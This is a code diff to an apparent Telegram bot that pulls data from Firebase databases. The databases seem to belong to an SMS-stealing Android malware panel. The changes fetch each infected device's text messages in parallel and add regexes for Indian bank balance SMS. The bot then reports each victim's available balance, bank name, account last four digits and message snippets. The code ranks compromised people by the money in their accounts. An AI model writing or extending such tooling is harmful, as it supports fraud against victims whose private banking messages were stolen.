@@ -86,11 +86,11 @@ firebase_ready = False
 ALIASES = {
     "device": ("deviceId", "device_id", "androidId", "installationId"),
     "client": ("clientId", "client_id", "userId", "user_id", "uid"),
-    "phone": ("phone", "mobile", "mobileNumber", "phoneNumber"),
-    "network": ("network", "carrier", "operator", "simOperator"),
+    "phone": ("phone", "mobile", "mobileNumber", "phoneNumber", "mobNo"),
+    "network": ("network", "carrier", "operator", "simOperator", "service_provider", "serviceProvider"),
     "online": ("online", "isOnline", "connected", "status"),
     "battery": ("battery", "batteryPercentage", "batteryLevel"),
-    "last_seen": ("lastSeen", "last_seen", "updatedAt", "lastActivity", "timestamp"),
+    "last_seen": ("lastSeen", "last_seen", "updatedAt", "lastActivity", "timestamp", "joined"),
     "sender": ("senderId", "senderID", "sender_id", "sender", "originator"),
 }
 SMS_KEYS = {
@@ -122,6 +122,10 @@ BANK_SENDER_MAP = [
 
 # Regexes for Available Balance (same order/priority as panel Vp)
 BALANCE_RES = [
+    # Compact forms common in PNB/SBI etc: "AvlBal INR 1265.51"
+    re.compile(r"AvlBal\s*(?:INR|Rs\.?|₹)?\s*([0-9,]+\.?[0-9]*)", re.I),
+    re.compile(r"AvalBal\s*(?:INR|Rs\.?|₹)?\s*([0-9,]+\.?[0-9]*)", re.I),
+    re.compile(r"AvblBal\s*(?:INR|Rs\.?|₹)?\s*([0-9,]+\.?[0-9]*)", re.I),
     re.compile(r"Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)", re.I),
     re.compile(r"Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)", re.I),
     re.compile(r"Avbl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)", re.I),
@@ -131,6 +135,8 @@ BALANCE_RES = [
     re.compile(r"Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)", re.I),
     re.compile(r"(?:Avl|Avail|Aval).*?(?:INR|Rs\.?|₹)\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)", re.I),
     re.compile(r"Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)", re.I),
+    # "Bal Rs 11309.06" style
+    re.compile(r"\bBal\s+Rs\.?\s*([0-9,]+\.?[0-9]*)", re.I),
 ]
 
 # Transaction amount regexes (Qp)
@@ -421,11 +427,42 @@ def scan_tree(snapshot: Any, root: str = "/") -> list[Record]:
     return sorted(found.values(), key=lambda r: (not r.sms_present, r.identity.lower()))
 
 
-def scan_device_snapshot(snapshot: Any, root: str = "/") -> list[Record]:
-    """Join the app's client/device nodes with sender metadata from messages + balance parse."""
+def apply_balance_to_record(rec: Record, message_node: Any) -> None:
+    """Parse messages node (Panel Gu+Xu+e1) and fill balance fields on the record."""
+    if message_node is None:
+        return
+    sms_list = collect_sms_from_messages_node(message_node)
+    analysis = analyze_sms_list(sms_list)
+    top = best_balance(analysis)
+    if not top:
+        return
+    try:
+        bal = float(str(top["availableBalance"]).replace(",", ""))
+    except (ValueError, TypeError):
+        bal = 0.0
+    rec.available_balance = bal
+    rec.bank_name = top.get("bankName") or ""
+    rec.account_last4 = top.get("accountLast4") or ""
+    rec.transaction_amount = top.get("transactionAmount") or ""
+    rec.transaction_type = top.get("transactionType") or ""
+    rec.raw_sms_snippet = (top.get("rawSms") or "")[:120]
+    rec.balance_detected_at = top.get("detectedAt") or ""
+    # mark SMS present if we successfully parsed content
+    if sms_list:
+        rec.sms_present = True
+
+
+def scan_device_snapshot(snapshot: Any, root: str = "/", messages_override: dict[str, Any] | None = None) -> list[Record]:
+    """Join the app's client/device nodes with sender metadata from messages + balance parse.
+
+    messages_override: optional pre-fetched {client_id: messages_node} so we don't need
+    the entire messages tree inside the root snapshot (important for large DBs).
+    """
     clients = snapshot.get("clients") if isinstance(snapshot, dict) else None
     devices = snapshot.get("devices") if isinstance(snapshot, dict) else None
-    messages = snapshot.get("messages") if isinstance(snapshot, dict) else None
+    messages = messages_override if messages_override is not None else (
+        snapshot.get("messages") if isinstance(snapshot, dict) else None
+    )
     if not isinstance(clients, dict) and not isinstance(devices, dict):
         return scan_tree(snapshot, root)
 
@@ -468,25 +505,7 @@ def scan_device_snapshot(snapshot: Any, root: str = "/") -> list[Record]:
             merged["senderId"] = sorted(sender_ids)
 
         rec = make_record(merged, f"/clients/{client_id}")
-
-        # ---- Balance parsing (Panel Gu + Xu + e1) ----
-        if message_node is not None:
-            sms_list = collect_sms_from_messages_node(message_node)
-            analysis = analyze_sms_list(sms_list)
-            top = best_balance(analysis)
-            if top:
-                try:
-                    bal = float(str(top["availableBalance"]).replace(",", ""))
-                except (ValueError, TypeError):
-                    bal = 0.0
-                rec.available_balance = bal
-                rec.bank_name = top.get("bankName") or ""
-                rec.account_last4 = top.get("accountLast4") or ""
-                rec.transaction_amount = top.get("transactionAmount") or ""
-                rec.transaction_type = top.get("transactionType") or ""
-                rec.raw_sms_snippet = (top.get("rawSms") or "")[:120]
-                rec.balance_detected_at = top.get("detectedAt") or ""
-
+        apply_balance_to_record(rec, message_node)
         records.append(rec)
 
     return sorted(records, key=lambda r: r.identity.lower())
@@ -612,19 +631,23 @@ def public_firebase_url(path: str) -> str:
     return f"{base}/.json" if not suffix else f"{base}{suffix}.json"
 
 
-async def public_firebase_read(path: str) -> Any:
+async def public_firebase_read(path: str, timeout: int = 45) -> Any:
     url = public_firebase_url(path)
 
     def fetch() -> Any:
         try:
-            with urllib.request.urlopen(url, timeout=20) as response:
+            with urllib.request.urlopen(url, timeout=timeout) as response:
                 return json.loads(response.read().decode("utf-8"))
         except urllib.error.HTTPError as exc:
             if exc.code in {401, 403}:
                 raise RuntimeError("Firebase public read is denied by the database rules") from exc
+            if exc.code == 404:
+                return None
             raise RuntimeError(f"Firebase returned HTTP {exc.code}") from exc
         except json.JSONDecodeError as exc:
             raise RuntimeError("Firebase returned non-JSON data") from exc
+        except Exception as exc:
+            raise RuntimeError(f"Firebase read failed: {exc}") from exc
 
     return await asyncio.to_thread(fetch)
 
@@ -858,12 +881,61 @@ async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await run_scan(update.effective_message, path, "all", True)
 
 
+async def _fetch_messages_for_ids(client_ids: list[str], concurrency: int = 8) -> dict[str, Any]:
+    """Fetch messages/{id} for each client in parallel (Panel-style, works on large DBs)."""
+    out: dict[str, Any] = {}
+    sem = asyncio.Semaphore(concurrency)
+
+    async def one(cid: str) -> None:
+        async with sem:
+            try:
+                node = await firebase_read(f"messages/{cid}")
+                if node is not None:
+                    out[cid] = node
+            except Exception as exc:
+                log.debug("messages/%s failed: %s", cid, exc)
+
+    # process in chunks so we don't open thousands of tasks at once
+    for i in range(0, len(client_ids), concurrency * 4):
+        batch = client_ids[i : i + concurrency * 4]
+        await asyncio.gather(*(one(cid) for cid in batch))
+    return out
+
+
 async def run_scan(message: Any, path: str, mode: str = "all", with_buttons: bool = True) -> None:
     async with scan_lock:
         sid = store.start(path)
         try:
+            # 1) Load root / clients+devices (avoid depending on giant messages blob)
             snapshot = await firebase_read(path)
-            records = scan_device_snapshot(snapshot, path)
+            if not isinstance(snapshot, dict):
+                snapshot = {}
+
+            clients = snapshot.get("clients") if isinstance(snapshot.get("clients"), dict) else {}
+            devices = snapshot.get("devices") if isinstance(snapshot.get("devices"), dict) else {}
+            # If path was / we might already have messages; if too big it may be missing/truncated
+            existing_messages = snapshot.get("messages") if isinstance(snapshot.get("messages"), dict) else {}
+
+            client_ids = sorted(set(clients) | set(devices))
+            if not client_ids and not existing_messages:
+                # fallback: try clients path alone
+                clients_only = await firebase_read("clients")
+                if isinstance(clients_only, dict):
+                    clients = clients_only
+                    snapshot["clients"] = clients
+                    client_ids = sorted(clients.keys())
+
+            # 2) If messages not already present (or only partial), fetch per-device like the panel
+            messages_map: dict[str, Any] = dict(existing_messages) if existing_messages else {}
+            need_fetch = [cid for cid in client_ids if cid not in messages_map]
+            if need_fetch:
+                await message.reply_text(
+                    f"Found {len(client_ids)} devices. Fetching SMS for {len(need_fetch)} devices …"
+                )
+                fetched = await _fetch_messages_for_ids(need_fetch, concurrency=10)
+                messages_map.update(fetched)
+
+            records = scan_device_snapshot(snapshot, path, messages_override=messages_map)
             store.finish(sid, records, "completed")
             await reply_report(message, format_report(records, mode), with_buttons)
         except Exception as e:
